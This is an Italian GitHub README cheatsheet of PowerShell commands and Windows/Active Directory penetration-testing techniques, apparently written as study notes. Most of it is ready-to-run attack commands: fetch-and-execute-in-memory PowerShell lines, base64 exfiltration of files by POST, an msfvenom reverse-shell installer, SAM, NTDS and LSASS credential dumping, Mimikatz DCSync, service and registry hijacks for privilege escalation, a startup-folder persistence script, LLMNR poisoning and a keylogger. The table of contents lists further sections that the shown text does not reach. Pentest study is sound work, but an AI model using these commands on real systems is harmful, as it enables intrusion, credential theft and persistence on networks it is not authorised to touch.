# Lista Link  
_Lista di comandi powershell generali, che vanno dalla info alla gestione dei file:_

 [Comandi Powershell:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell)
<!-- spazio -->
   - [Comandi Powershell info generali PC](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell-info-generali-pc)
 <!-- spazio -->
   - [Comandi per i file](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#comandi-per-i-file)
       - [Download/Upload file](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#downloadupload-file)
 <!-- spazio -->
   - [Comandi ADS (Alternate Data Stream)](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet#comandi-ads-alternate-data-stream)
  
_Lista che viene aggiornata man mano con metodologie, tool, comandi e CVE inerenti al mondo dell Active Directory:_

 [Active Directory Pentest:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#active-directory-pentest)
<!-- spazio -->
   - [Privilege Escalation:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#privilege-escalation)
       - [Servizi](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#servizi__)
       - [Registri](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#registri__)
       - [Credenziali](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#credenziali)
           - [Tool Credenziali](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#tool-credenziali)
       - [Varie](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#varie)
       - [tools](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#tools-1)
<!-- spazio --> 
   - [Lateral movements:](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#lateral-movements)
       - [Lanciare comandi da remoto](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#lanciare-comandi-da-remoto)
       - [Port Forwarding](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#port-forwarding)
<!-- spazio -->
   - [Persistence:](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#persistence)
       - [Gruppi](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#gruppi)
       - [Privilegi](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#privilegi)
       - [Servizi](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#servizi-1)
       - [File](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#file)
       - [Registri](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#registri-1)
       - [Varie](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#varie-2)
<!-- spazio --> 
   - [Tools:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/edit/main/README.md#tools)
       - [Powerview](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#Powerview)
       - [Bloodhund settings](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#bloodhund-settings)
       - [Mimikatz](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#mimikatz)
       - [Suite impacket e utilizzi](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#suite-impacket-e-utilizzi)
<!-- spazio -->
   - [DACL attacks:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#dacl-attacks)
        - [AddMembers](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#addmember)
        - [WriteDACL](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#dacl-attacks)
        - [ForceChangePassword](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#forcechangepassword)
        - [GenericAll](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#genericall)
        - [WriteOwner](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#writeowner)
        - [GenericWrite](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#genericwrite)
<!-- spazio -->
   - [Bypass:](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#bypass)
        - [Bypass UAC](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#bypass-uac)
        - [Bypass AMSI](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#bypass-amsi)
        - [Bypass Applocker](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#bypass-applocker)
<!-- spazio -->
   - [CVE:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#cve)
        - [CVE-2022-26923](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#cve-2022-26923-vulnerabilit%C3%A0-sui-certificati-dellad)
           - [Certificati AD](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#certificati-ad)
<!-- spazio -->
   - [Note pentest](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-pentest)
<!-- spazio -->
_Argomenti, note e tools inerenti a Windows:_

 [Windows:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#windows)
<!-- spazio -->
   - [Processi di avvio](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/tree/main#processi-di-avvio)
<!-- spazio -->
   - [API](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet#api)
<!-- spazio -->
   - [Register keys](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#register-keys)
<!-- spazio -->
   - [UAC](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#uac)
<!-- spazio -->
   - [AMSI](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#amsi)
<!-- spazio -->
   - [Suite SysInternals](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#suite-sysinternals)
        - [File e dischi](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#file-e-dischi)
        - [Rete](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#rete)
        - [Processi](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#processi)
        - [Sicurezza](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#sicurezza)
        - [Informazioni di sistema](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#informazioni-di-sistema)
        - [Generali](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#generali)
<!-- spazio -->
   - [Forense](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#forense)
        - [FAT e NTFS](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#fat-e-ntfs)
        - [Registri](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#registri-2)
        - [File]()
        - [Applicazioni]()
        - [Log]()
        - [Device Esterni]()
        - [Tool Forense]()
<!-- spazio -->
   - [Note sulla sicurezza in Windows](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-sulla-sicurezza-in-windows)
<!-- spazio -->
_Sezione dei credits per i riconoscimenti:_
<!-- spazio -->
[Credits](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#credits)
<!-- spazio -->
# Comandi Powershell:
<!-- -->
    fl #per ricevere più output 
<!-- -->
ES: 
_Get-Acl | fl_
<!-- -->
    Get-Help <nome comando> -Full #ottieni l'help dei comandi
 <!-- spazio -->
    Update-Help -Force #per aggiornare gli help alla versione più recente    
 <!-- spazio -->
    Select-Object #utilizzato per prendere un campo dell'oggetto specifico 
ES:
_Get-LocalUser John | Select-Object LastLogon_
<!-- -->
    Get-Command #utilizzato per sapere se un comando o un eseguibile è presente in powershell
ES:
_Get-Command *User*_
<!-- spazio -->
    New-LocalUser  #per creare nuovi utenti locali
<!---->
ES:
_New-LocalUser -Name User -Password (ConvertTo-SecureString -AsPlainText "123456789" -Force)_
<!-- -->
    New-LocalGroup #per creare un nuovo gruppo
<!-- -->
ES:
_New-LocalGroup -Name $Group_
<!-- -->
    Add-LocalGroupMember #aggiungi un utente ad un gruppo
<!-- -->
ES:
_Add-LocalGroupMember -Group $Group -Member $User_
<!---->
    reg query #per interrogare i registri
<!-- spazio -->
    New-item #per creare file, cartelle o modificare valori
 <!-- spazio -->
    Set-item #per modificare file, cartelle o modificare valori
<!-- spazio -->
    Start-service <nome servizio> #comando per avviare un servizio     
ES:
_Start-service WinRM_
<!-- spazio -->
 ### Comandi Powershell info generali PC  
<!-- spazio -->
    Get-ComputerInfo #prendi informazioni della macchina
<!-- spazio -->
    Get-Localuser #listi gli utenti nella macchina
<!-- spazio -->
    Get-ScheduledTask #listi tutti gli schedule task /tasklist
<!-- spazio -->
    Get-Acl #per listare le access-list dei permessi
<!-- spazio -->
    Get-PSDrive  #lista i drive dell'ambiente legati a powershell che possono essere variabili,oggetti,registri e volumi.
<!-- spazio -->  
    Get-ADDomain #per prendere tutte le informazione dell'AD Domain
<!-- spazio -->  
    Get-NetIPAddress #comando powershell per ottenere configurazione di rete
<!-- spazio -->     
### Comandi per i File
<!-- spazio -->
      Get-Content -path "<file>" # comando per leggere il contenuto
ES:
<!-- spazio -->
_(Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)_
<!-- spazio -->
      [IO.File]::WriteAllBytes(<file path>, <dati da scrivere>) #dalla classe IO.FILE richiama WriteAllBytes che scrive i Bytes
<!-- spazio -->

### Download/Upload File

__Download:__

_Download cioè dalla nostra machine alla target machine_
<!-- spazio -->
      curl -o reverse.exe http://<ip source>/<file da scaricare>
<!-- spazio -->
      (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File>') #semplice download
 <!--spazio -->
      (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')#download async cioè senza bloccare il calling thread
 <!--spazio -->
      [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} #Bypassing controllo certificato 
 <!--spazio -->
_possiamo trasferire un file senza dovre scaricare uno script ma runnarlo direttamente in memoria:_ 
 <!-- spazio -->
      IEX (New-Object Net.WebClient).DownloadString(<target File URL>, <Output File>) # tramite IEX(Invoke-Expression) runniamo direttamentei in memoria
 <!-- spazio -->
 __Upload:__
 
 _Upload cioè dalla target machine alla nostra macchina_
  <!-- spazio -->
 _Comandi per avviare un server upload python e comandi powershell per inviare:_
 <!-- spazio -->
      pip3 install uploadserver #modulo che permette l'avvio di un uploadserver
<!-- spazio -->
      python3 -m uploadserver #comando per avviarlo e funzionerà sulla porta 8000
<!-- spazio -->
_Utilizzo dello script PSUpload.ps1 (Script che rende più semplice l'upload di file o cartelle)_
<!-- spazio -->
      python3 -m http.server 80 #comando per avviare il python server contenente lo script
<!-- spazio -->
      curl -o <nome eseguibile>.ps1 https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1 #comando per scaricare l'eseguibile dal sito web
<!-- spazio -->
      IEX(New-Object Net.WebClient).DownloadString('http://<nostro_ip_locale>:<nostra_porta>/PSUpload.ps1') #comando variante che senza scarica lo script lo runna direttamente
<!-- spazio -->
      . .\PSUpload.ps1 #comando per runnare lo script
<!-- spazio -->  
      Invoke-FileUpload -Uri <URL da dove fare upload> -File <Path file di cosa uplodare> #comando dello script per fare upload dei file
<!-- spazio --> 
_Upload tramite encoding in base64:_ 
<!-- spazio -->
      b64 = [System.convert]::ToBase64String((Get-Content -Path '<file target>' -Encoding Byte))
      #variabile che stora il base64 del file
<!-- spazio -->      
      Invoke-WebRequest -Uri <ip server> -Method POST -Body $b64 #inviamo il base64 del file tramite richiesta POST
<!-- spazio -->
- __SMB server:__

_Comando per avviare il server SMB per l'upload e download:_ 
 <!-- spazio -->
      impacket-smbserver <nome share online> <path directory locale che condividi>
<!-- spazio -->
      impacket-smbserver <nome share online> -smb2support <path directory locale che condividi> #comando per avviarlo con smbV2
<!-- spazio -->
      copy <path del file da uplodare>  \\<ip della destinazione dove mandare>\<nome share a cui accedere> 
      #comando per fare upload, facendo una copia sul server SMB upload
<!-- spazio -->
      copy \\ip sorgente da cui scaricare\<nome share>\<file da scaricare> <Path locale di dove salvarlo>
<!-- spazio -->
      net use n: \\<ip target>\share /user:test test #fare il mount da di un SMB su una windows machine
<!-- spazio -->
    
### comandi ADS (alternate data stream)
<!-- -->

_ADS (Alternate Data Streams), feature che permette di avere molteplici flussi di dati in un singolo file_

_Lista di comandi utili per gestire gli ADS_

_Comandi:_
<!-- -->
      Get-Item -path <path> -stream * #ottiene tutti gli ADS 
<!-- -->
      set-content -path <path del file> -stream <nome del nuovo stream> -value <contenuto per lo stream> #crea un nuovo ADS con il contenuto indicato
<!-- -->
      gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data' #cerca in tutto il filesystem la presenza di ADS
<!-- -->
      remove-item –path <path al file> –stream <nome stream da rimuovere> #rimuove lo stream su un determinato file
<!-- -->
      Get-Content -path <path del file da leggere>:<nome dell'ADS> #comando per leggere il contenuto dello stream di un file
<!-- -->
# Active Directory Pentest:

_comandi SMB:_
<!-- spazio -->
    smbmap -H <ip> -L #comando per listare e indica i permessi
<!-- spazio -->
    smbclient -L \\\\\<ip>\\ #comando per listare
<!-- spazio -->
    smbclient  \\\\<ip>\\<shares> -U <user> #comando per entrare nello share e poi inserire la password
<!-- spazio -->
_enumerazione del DC:_
Comando per enumerare il DC, ci da l'output di: nome dominio, gruppi, utenti e SMB e altro:
<!-- spazio -->
    enum4linux <ip> #enumerazione
<!-- spazio -->    
_enumerazione utenti:_
<!-- spazio -->

-crackmapexec, però se abbiamo l'accesso a IPC$ all'interno di SMB:
<!-- spazio -->
    crackmapexec smb VULNNET-RST -u 'guest' -p '' --rid-brute
<!-- spazio -->

-kerbrute, tramite una lista di user possiamo vederee che Users ci sono:
<!-- spazio -->
    kerbrute_linux_amd64 userenum -d <domain_name> --dc <domain_controller_ip> <wordlist>
<!-- spazio -->

_recupero TGT utenti:_
<!-- spazio -->
    impacket-GetNPUsers <dominio>/<utente> -no-pass #funziona solamente con utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH
<!-- spazio -->

_recupero credenziali:_
<!-- spazio -->
    impacket-secretsdump -dc-ip <ip della macchina> <utente>:<password>@<ip macchina> #recupera NTDS.DIt, SAM hashes
<!-- spazio -->
_connessione remota alla target machine e comandi utili:_
<!---->
    winexe -U '<username>%<password>' //<ip_bersaglio> cmd.exe  #esegue processi (in questo caso cmd) da remoto sfruttando SMB
<!-- spazio -->
    evil-winrm -i <nome dominio> -u <nome utente> -H <hash NTLM> o -p <password> #utilizziamo il WinRM protocol per connettersi
<!-- spazio -->
    upload <path file da dove caricare> <nome di come salvarlo> #comando per uplodare dalla kali alla target machine il file
<!-- spazio -->
    download <path file dove scaricare> <path file dove salvare> #comando per il download del file dalla target machine alla kali
<!-- spazio -->
    rdesktop -u <nome utente> -p <password> <ip> #comando per connettersi con RDP
_utilizzo di responder che tramite LLMNR(Link-Local Multicast Name Resolution poisoning) recupera le credenziali in chiaro._
<!-- spazio -->
    sudo responder -I <interfaccia di rete>
<!-- spazio -->
_attacchi MITM._
<!-- spazio -->
     sudo python3 mitm6.py -i <interfaccia di rete> -d <nome dominio target> #tool utilizzato per il man in the middle su ipv6
<!-- spazio -->
# Privilege Escalation:
<!---->
 _alcuni metodi per scalare i propri privilegi in windows e controllare permessi che potrebbero essere vettore di scalata_
 <!---->

 ### Servizi:
 
 - __Abusare permessi insicuri nei servizi:__

 _Per controllare le misconfiguration utilizzeremo accesschk.exe (utility che serve a controllare i permessi ACL su oggetti di sistma Windows) è contenuto nella 
 suite di sysmon scaricabile dal seguente [link](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk):_
 <!---->
    accesschk.exe /accepteula -uwcqv <nome_utente> <nome_servizio> #restituisce i permessi dell'utente relativi al servizio ricercato
 <!---->
 _se l'utente ha il seguente privilegio __"SERVICE_CHANGE_CONFIG"__ può essere vettore di scalata:_
 <!---->
 _facciamo una query al servizio per controllare che giri come SYSTEM (o LocalSystem) sotto la voce __"SERVICE_START_NAME"___
 <!---->
    sc qc <nome_servizio> #fa una query al servizio per ottenere i suoi dettagli
 <!---->
 _a questo punto possiamo sostituire il binario puntato dal servizio con uno creato da noi per farlo eseguire al riavvio:_
 <!---->
    sc config <nome_servizio> binpath= "\"<path_al_nostro_eseguibile>\"" #indichiamo la path con gli apici attraverso l'escape char
 <!---->
    net start <service> #avviando il servizio verrà lanciato il nostro eseguibile come amministratore
 <!---->
 
- __abusare di path non racchiuse da doppi apici:__
 <!---->
_se la path di un servizio è scritta nel seguente modo: 
<!---->
    BINARY_PATH_NAME: <Path_al_servizio>\<directory>\.. #non racchiusa dalle virgolette 

_può essere vettore di scalata di priviliegi perchè senza doppie virgolette la path viene letta male dal sistema e con gli spazi che vengono letti come dei break windows proverà ad eseguire un qualcosa prima di ogni spazio_

ES:
C:\Windows\Tasks\rev.exe

C:\rev.exe

C:\Windows\rev.ese

C:\windows\Tasks\rev.exe

_possiamo di conseguenza inserire un eseguibile (sempre se ho i permessi di write sui servizi e sulla directory da modificare)._
<!---->
    copy <Path_del_nostro_eseguibile> "<path_del_servizio>\Common.exe" #così facendo il sistema cercerà la path e arrivato allo spazio eseguirà il nostro comando     prendendo i dati successivi come argomenti dell'eseguibile
<!---->
    net start <service_name>
<!---->
- __Abusare di eccessivi permessi di modifica delle chiavi di registro:__
<!---->
    sc qc <nome_servizio> #fa una query al servizio
<!---->
    accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<nome_servizio> #controlla i permessi e chi ha accesso alle chiavi di un servizio di      resgistro
<!---->
___"NT AUTHORITY\INTERACTIVE"__ se le chiavi sono accessibili da questo gruppo significa che tutti gli utenti con logon possono modificarle:_
<!---->
    reg add HKLM\SYSTEM\CurrentControlSet\services\<nome_servizio> /v ImagePath /t REG_EXPAND_SZ /d <path_nostro_eseguibile> /f
<!---->
    net start <nome_servizio>
<!---->
- __Abusare permessi di scrittura sugli eseguibili dei servizi:__
<!---->
    sc qc <nome_servizio> #fa una query al servizio
<!---->
    C:\PrivEsc\accesschk.exe /accepteula -quvw "<Path servizio>"
<!---->
 _Notiamo che il __"BINARY PATH NAME"__ è scrivibile da tutti_
<!---->
    copy <nostro_eseguibile> <path_del_binario_del_servizio> #se abbiamo permessi di scrittura sull'eseguibile del servizio possiamo sostituirlo con il nostro 
<!---->

### Registri:

- __Abusare degli autorun attraverso le chiavi di registro:__
<!---->
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #interroga i registri per cercare eseguibili con autorun
<!---->
    accesschk.exe /accepteula -wvu "<path_dell_eseguibile>" #ricerca le proprietà degli eseguibili che sono autorun
<!---->
_se l'eseguibile è word-writable possiamo sostituirlo con il nostro e riavviare la macchina:_
<!---->
    copy <nostro_eseguibile_da_runnare> "<path_dell_autorun>" /Y  #dopo il riavvio si attiverà automaticamente
<!---->
- __Abusare dei privilegi di installazione come amministratore (permettono di installare sempre un programma come amministratore)__
  
  _Andremo a controllare tramite la reg query se AlwaysInstallElevated è settato a 1 o 0, AlwaysInstallElevated controlla la richiesta di elevazione dei privilegi del MSI installer, se settato a 0 l'installer richiede di elevare i privilegi solo quando serve invece se ad 1 l'installer lo richiede sempre cosi facendo può causare una scalata dei privilegi._
  
<!---->
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  #interroga le chiavi di registro
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  #se sono settate su 0x1 sono attive
<!---->
_possiamo creare un installer con msfvenom per richiamare una revshell da amministratore quando installato:_
<!---->
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip_attaccante> LPORT=<porta_attaccante> -f msi -o installer.msi
<!---->

### Credenziali:

_Questa sezione fa riferimento a luoghi generali o errori di dove possano esservi delle credenziali_

- __Dumping di password dai registri:__

_Comandi:_
<!---->
     reg query HKLM /f password /t REG_SZ /s #ricerca dei registri che contengono la parola password
<!---->
     reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" #comando per la ricerca di password del logon
<!---->
- __Dumping di password dal credmanager:__

_Comandi:_
<!---->
     vaultcmd /list #comando per vedere se sono presenti dei vaults per le password
<!---->
_Nel credmanager di solito sono 2 i vault uno web e uno windows, per recuperare quello Web esiste uno script powershell che si scarica da [qui](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)_
<!---->
     powershell -ex bypass #comando per poter attivare lo script
<!---->
     Import-Module .\Get-WebCredentials.ps1 #comando per importare il modulo
<!---->
     Get-WebCredentials #comando per recupere le credenziali dal vault web     
<!---->  
_Esiste poi un tool chiamato __"cmdkey"__, utilizzato per creare, eliminare o modificare le credenziali registrate nel credmanager può essere utilizzato con la command-line __"RunAs"___
<!---->
     cmdkey /list #comando per listare possibili credenziali salvate
<!----> 
     runas /savecred /user:<dominio\nome utente oppure solo nome utente> cmd.exe #comando che tramite le credenziali salvate apre una nuova shell con l'utente specificato
<!----> 
- __Dumping del SAM e del SYSTEM:__

_Se abbiamo la fortunata di trovare in giro un backup del SAM o del SYSTEM o ancora meglio, avere privilegi come SeBackup/SeRestore (permettono di leggere e scrivere ogni file del fileysystem bypassandro le ACL) o fare parte del gruppo Backup Operators possiamo salvarceli e dumpare le credenziali_

_Comandi:_
<!---->  
    reg save hklm\system C:\Users\backup\system.hive
    reg save hklm\sam C:\Users\backuo\sam.hive
    reg save hklm\system system.bak
    reg save hklm\sam sam.bak
    #tipologie di comandi per salvare SAM e SYSTEM
<!---->  
    copy C:\Windows\Repair\Systen.hive \\<ip destinazione>\<nome share>\ 
    copy C:\Windows\Repair\sam.hive \\<ip destinazione>\<nome share>\ #comandi per passarsi i backup tramite SMB
<!---->  
    git clone https://github.com/Tib3rius/creddump7 #comando per installare le repo di creddump7
    pip3 install pycrypto #comando per installarlo
    python3 creddump7/pwdump.py SYSTEM SAM #comando per recuperare le password
<!---->  
    imapacket-secretsdump -sam sam.bak -system system.bak LOCAL #comando che utilizza la suite impacket per recuperare gli hash
<!---->
- __Dumping NTDS:__

_NTDS è un database contenente dati, credenziali per un domain controller, di default è situato in __"C:\Windows\NTDS"__ e per gestirlo viene utilizzata una utility apposta chiamata __"Ntdsutil"___

__Bisogna avere dei permessi d'amministratore__

_File richiesti:_
<!---->
    C:\Windows\NTDS\ntds.dit
    C:\Windows\System32\config\SYSTEM
    C:\Windows\System32\config\SECURITY
<!---->    
_Comandi:_
<!---->
    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\prova' q q" #comando che tramite ntdsutil fa il dump dei file richiesti
<!---->
    secretsdump.py -security <path SECURITY file> -system <path SYSTEM file> -ntds <path ntds.dit file> local #comando che tramite secretsdump, dumpa il DB e ottenendo hash 
<!---->
- __LAPS:__

_LAPS è utilizzato per la gestione centralizzata delle password, permettendo la generazione, rotazione e ripristino delle password_

_Comandi:_
<!---->
     dir "C:\Program Files\LAPS\CSE" #comando per vedere se presente LAPS, infatti se presente troviamo una .dll
<!---->
     Get-Command *AdmPwd* #comando per capire che cmdlets possiamo utilizzare con il nome AdmPwd
<!---->
     Find-AdmPwdExtendedRights -Identity * #comando per cercare quale OU ha "All extended rights"
<!---->
     net groups "nome gruppo" #comando per vedere i membri del gruppo ai quali dovremmo accedere
<!---->
     Get-ADComputer -Filter * | fl * #comando per listare il nome del computer con LAPS attivo, in quanto non tutti lo hanno
<!---->
     Get-AdmPwdPassword -ComputerName <nome computer> #comando per recuperare la LAPS password 
<!---->
_Esistono diversi script o tool per automatizzare la ricerca uno è possivile scaricarlo da [qui](https://github.com/leoloobeek/LAPSToolkit)._

- __Credenziali di WDS:__
  
_Quando si vuole installare una stessa immagine di windows ma su più macchine nella rete, è possibile utilizzare Windows Deployment Services, il quale installa la stessa image su diversi computer attraverso la rete e lo fa in maniera autonoma, puà capitare che all'interno di determinati file possano esserce ancora delle credenziali_

_cartelle:_
<!---->  
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
<!---->  
- __History powershell e cmd:__

_windows in un file tiene traccia dei comandi powershell o cmd che uno scrive e possiamo recuperarli con questi Comandi:_
<!---->  
    %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt #comando per aprire la history in cmd
<!---->  
    C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt #comando per aprire la history in powershell
<!---->  

- __Configurazione IIS:__

_IIS(Internet Information Service) è il web server di default in windows, dove è possibile che vi siano delle credenziali nel file __"web.config"___

_Comandi:_

_Ecco le cartelle dove poter  andare a vedere_ 
<!---->  
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
<!---->  
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString #comando per cercare credenziali
<!----> 
- __Putty proxy configurations:__

_Putty è un SSH client che troviamo spesso nelle windows machine, è possibile recuperare le sue proxy configuration, dove tiene le credenziali in chiaro_

_Comandi:_
<!---->  
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
<!---->

- __LSASS:__

_Il servizio che si occupa dell'autenticazione nei sistemi windows o nell'AD, è un target fondamentale per il recupero di password hashes e ticket, può essere dumpato in diverse maniere._

_Comandi:_

_Disponendo di una GUI alla target machine è possibile tramite task manager dumpare LSASS:_
<!---->
     Task Manager-> lsass.exe-> Creare file di dump della memoria #passi per creare un dump del LSASS
<!---->
_Possiamo dumpare anche se abbiamo a disposizione [procdump della SysInternal suite](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#processi):_
<!---->
     procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump #comando per dumpare tramite procdump
<!---->
_Vi è un però i metodi sopra spiegati non funzionano se prima non viene disattivata la protezione LSA con i seguenti metodi:_
<!---->
     HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa #path della key da cercare
<!---->
     RunAsPPL = 1 #value della key che va modificata in 1 per disattivare LSA
<!---->
 _Altrimenti se si dispone di [Mimikatz](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#mimikatz) vi è un'altro modo_

- __DCSync attack:__

_Consiste nel simulare il comportamento di un domain controller e poter recuperare le password di altri utenti tramite replicazione di dominio._

_Comandi:_
<!---->
     mimikatz lsadump::dcsync /domain:<nome dominio> /user:<nome utente> #comando che il DCSync di un solo utente
<!---->
     mimikatz lsadump::dcsync /domain:<nome dominio> /all #comando che fa il DCSync di tutto il DB
<!---->
     log <nome>.txt #comando per salvare il contenuto di un comando in file di log
<!---->
_Qui viene spiegato il tipo di attacco ma la lista di comandi ulteriori di mimikatz è [qui](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#mimikatz)_

- __Metasploit Keylogger:__

_La msfconsole dispone di un keylogger integrato che puà ritornare molto utile per il recupero di eventuali password_

_Comandi:_
<!---->
      keyscan_start #comando per avviare il keylogger
<!---->
      keyscan_dump #comando per dumpare quello che ha registrato il keylogger
<!---->
      keyscan_stop #comando per fermare il keylogger
<!---->
##### Tool Credenziali:

_Esistono diversi tool che automatizzano il recupero di credenziali quali:_

- [Snaffler](https://github.com/SnaffCon/Snaffler)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [Lazagne](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)

### Varie:

- __Utilizzo di GUI:__

_Quando possibile se si ha accesso ad una windows machine cioè tramite RDP ed quindi possibile utilizzare la GUI e vi possono essere degli eseguibili che runnano in modalità privilegiatà puù essere utile un commando._
<!---->
     tasklist /V | findstr <nome eseguibile> #comando che lista tutti i processi in verbose mode che poi manda a findstr per cercare il determinato processo
<!---->

- __StartUp directory:__
<!---->
     C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" #comando per vedere se abbiamo i permessi di writing sulla cartella StartUp
<!---->
     Set oWS = WScript.CreateObject("WScript.Shell")
     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
     Set oLink = oWS.CreateShortcut(sLinkFile)
     oLink.TargetPath = "C:\<word writable folder>\<nome eseguibile da usare>.exe"
     oLink.Save #questo script in vbs permette di creare un collegamento nella directory startup che punterè ad un nostro eseguibile
<!---->
- __Potato attacks:__

_Rogue potato:_

Spiegazione: 

_Con i privilegi SeAssignPrimaryToken o SeImpersonate privilege un utente può runnare codice o creare nuovi processi in account di altri utenti. con l'exploit da un local o network service diventiamo System_

Commandi:
<!---->
     sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.3.158:9999 #bindiamo la porta della nostra macchina 135 alla 9999 di windows
<!---->
     nc -lnvp <porta> #comando per aprire un listener
<!---->
     C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\<path revshell> #entriamo con l'utente che ha i privilegi sopra citati e con PSexec64 apriamo una revshell
     con l'utente "nt authority\local service" alla nostra machine
<!---->
